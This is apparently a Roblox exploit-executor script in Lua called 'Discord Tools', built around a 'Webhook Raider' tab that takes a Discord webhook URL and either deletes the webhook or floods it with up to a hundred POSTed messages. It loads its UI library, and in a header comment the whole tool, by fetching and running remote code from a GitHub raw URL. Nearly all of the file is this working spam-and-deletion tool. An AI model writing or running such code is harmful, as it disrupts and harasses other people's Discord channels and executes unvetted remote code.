--[=[
	Collaborators: userofwind , LeadMarker
	loadstring(game:HttpGet('https://raw.githubusercontent.com/LuXSystematic/RobloxScripts/master/DiscordTools.lua'))()
]=]

-- UI Setup
local Library = loadstring(game:HttpGet('https://raw.githubusercontent.com/LuXSystematic/RobloxScripts/main/UILibrary.lua'))()
local UI = Library:SetupUI('Discord Tools')

-- Tabs
local WebhooksTab = UI:CreateTab('Webhooks')
local CreditsTab = UI:CreateTab('Credits')

-- Variables
local MsgAmount = 0
local Request = { Headers = { ['Content-Type'] =  'application/json' } }	

-- UI Hotkey
UI:SetHotkey('g')

-- Webhook Raider Tab
WebhooksTab:CreateBox(
	'Webhook URL',
	function (Value)
		Request.Url = Value
	end
)

WebhooksTab:CreateBox(
	'Msg To Send',
	function (Value)
		Request.Body = game:GetService('HttpService'):JSONEncode { content = Value }
	end
)

WebhooksTab:CreateSlider(
	'Msg Amount',
	0,
	100,
	function (Value)
		MsgAmount = Value
	end
)

WebhooksTab:CreateButton(
    "Delete Webhook", 
    function()
        Request.Method = 'DELETE'
		
	    local RequestSucceeded, ResultFromRequest = pcall(function ()
	        syn.request(Request)
	    end)
	
	    if not RequestSucceeded then
	        UI:Notify('The deletion failed!\n\n' .. ResultFromRequest, 7)
	    else
	        UI:Notify('Successfully deleted the webhook.', 7)
	    end
	    
	    Request = {	Headers = { ['Content-Type'] =  'application/json' } }
    end
)


WebhooksTab:CreateButton(
	'Raid Webhook',
	function ()
	    Request.Method = 'POST'
	    
		local RequestSucceeded, ResultFromRequest = pcall(function ()
			for i = 0, MsgAmount do
				syn.request(Request)
			end
		end)
		
		if not RequestSucceeded then
		    UI:Notify('The raid failed!\n\n' .. ResultFromRequest, 7)
		else
		    UI:Notify('Successfully raided the webhook.', 7)
		end
		
		Request = { Headers = { ['Content-Type'] =  'application/json' } }	
	end
)

-- Credits Tab
CreditsTab:CreateButton(
    'Copy Discord Invite',
    function ()
        setclipboard('https://discord.gg/MYKWPDyJd6')
    end
)
